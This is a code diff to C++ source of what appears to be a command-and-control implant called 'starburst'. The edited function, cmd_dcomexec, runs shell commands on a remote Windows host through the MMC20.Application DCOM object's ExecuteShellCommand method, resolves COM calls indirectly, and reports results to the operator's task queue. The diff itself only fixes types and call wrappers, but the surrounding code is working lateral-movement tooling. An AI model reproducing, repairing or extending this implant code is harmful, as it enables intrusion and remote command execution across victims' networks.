@@ -18,7 +18,7 @@ static const GUID LOCAL_IID_NULL = { 0x00000000, 0x0000, 0x0000, { 0x00, 0x00, 0
 
 typedef HRESULT (WINAPI *fnCoInitializeEx)( LPVOID, DWORD );
 typedef void    (WINAPI *fnCoUninitialize)( void );
-typedef HRESULT (WINAPI *fnCoCreateInstanceEx)( REFCLSID, IUnknown*, DWORD, COSERVERINFO*, DWORD, MULTI_QI* );
+typedef HRESULT (WINAPI *fnCoCreateInstanceEx)( const CLSID*, IUnknown*, DWORD, COSERVERINFO*, DWORD, MULTI_QI* );
 typedef HRESULT (WINAPI *fnCoInitializeSecurity)( PSECURITY_DESCRIPTOR, LONG, void*, void*, DWORD, DWORD, void*, DWORD, void* );
 
 typedef BSTR (WINAPI *fnSysAllocString)( const OLECHAR* );
@@ -95,7 +95,7 @@ auto declfn starburst::cmd_dcomexec(
     HRESULT hr = (HRESULT)SCALL_PTR( inst, pCoInitializeEx, nullptr, 0 );
 
     if ( pCoInitializeSecurity ) {
-        SCALL_PTR( inst, pCoInitializeSecurity, nullptr, -1, nullptr, nullptr, 4, 3, nullptr, 0, nullptr );
+        SCALL_PTR_VOID( inst, pCoInitializeSecurity, nullptr, -1, nullptr, nullptr, 4, 3, nullptr, 0, nullptr );
     }
 
     wchar_t w_host[256] = {};
@@ -107,9 +107,9 @@ auto declfn starburst::cmd_dcomexec(
     MULTI_QI mqi = {};
     mqi.pIID = &LOCAL_IID_IDispatch;
 
-    hr = (HRESULT)SCALL_PTR( inst, pCoCreateInstanceEx, CLSID_MMC20, nullptr, 0x14, &si, 1, &mqi );
+    hr = (HRESULT)SCALL_PTR( inst, pCoCreateInstanceEx, &CLSID_MMC20, nullptr, 0x14, &si, 1, &mqi );
     if ( FAILED( hr ) || FAILED( mqi.hr ) || !mqi.pItf ) {
-        SCALL_PTR( inst, pCoUninitialize );
+        SCALL_PTR_VOID( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CoCreateInstanceEx MMC20 failed - check DCOM perms" ) ) );
         return;
@@ -123,7 +123,7 @@ auto declfn starburst::cmd_dcomexec(
     hr = pApp->lpVtbl->GetIDsOfNames( pApp, LOCAL_IID_NULL, doc_names, 1, LOCALE_SYSTEM_DEFAULT, &doc_dispid );
     if ( FAILED( hr ) ) {
         pApp->lpVtbl->Release( pApp );
-        SCALL_PTR( inst, pCoUninitialize );
+        SCALL_PTR_VOID( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetIDsOfNames Document failed" ) ) );
         return;
@@ -136,7 +136,7 @@ auto declfn starburst::cmd_dcomexec(
         DISPATCH_PROPERTYGET, &dp_empty, &vt_doc, nullptr, nullptr );
     if ( FAILED( hr ) || vt_doc.vt != VT_DISPATCH || !vt_doc.pdispVal ) {
         pApp->lpVtbl->Release( pApp );
-        SCALL_PTR( inst, pCoUninitialize );
+        SCALL_PTR_VOID( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "Invoke Document failed" ) ) );
         return;
@@ -151,7 +151,7 @@ auto declfn starburst::cmd_dcomexec(
     if ( FAILED( hr ) ) {
         pDoc->lpVtbl->Release( pDoc );
         pApp->lpVtbl->Release( pApp );
-        SCALL_PTR( inst, pCoUninitialize );
+        SCALL_PTR_VOID( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetIDsOfNames ActiveView failed" ) ) );
         return;
@@ -164,7 +164,7 @@ auto declfn starburst::cmd_dcomexec(
     if ( FAILED( hr ) || vt_view.vt != VT_DISPATCH || !vt_view.pdispVal ) {
         pDoc->lpVtbl->Release( pDoc );
         pApp->lpVtbl->Release( pApp );
-        SCALL_PTR( inst, pCoUninitialize );
+        SCALL_PTR_VOID( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "Invoke ActiveView failed" ) ) );
         return;
@@ -180,7 +180,7 @@ auto declfn starburst::cmd_dcomexec(
         pView->lpVtbl->Release( pView );
         pDoc->lpVtbl->Release( pDoc );
         pApp->lpVtbl->Release( pApp );
-        SCALL_PTR( inst, pCoUninitialize );
+        SCALL_PTR_VOID( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetIDsOfNames ExecuteShellCommand failed" ) ) );
         return;
@@ -208,12 +208,12 @@ auto declfn starburst::cmd_dcomexec(
     hr = pView->lpVtbl->Invoke( pView, esc_dispid, LOCAL_IID_NULL, LOCALE_SYSTEM_DEFAULT,
         DISPATCH_METHOD, &dp, &vt_result, nullptr, nullptr );
 
-    for ( int i = 0; i < 4; i++ ) SCALL_PTR( inst, pSysFreeString, args[i].bstrVal );
+    for ( int i = 0; i < 4; i++ ) SCALL_PTR_VOID( inst, pSysFreeString, args[i].bstrVal );
 
     pView->lpVtbl->Release( pView );
     pDoc->lpVtbl->Release( pDoc );
     pApp->lpVtbl->Release( pApp );
-    SCALL_PTR( inst, pCoUninitialize );
+    SCALL_PTR_VOID( inst, pCoUninitialize );
 
     if ( SUCCEEDED( hr ) ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
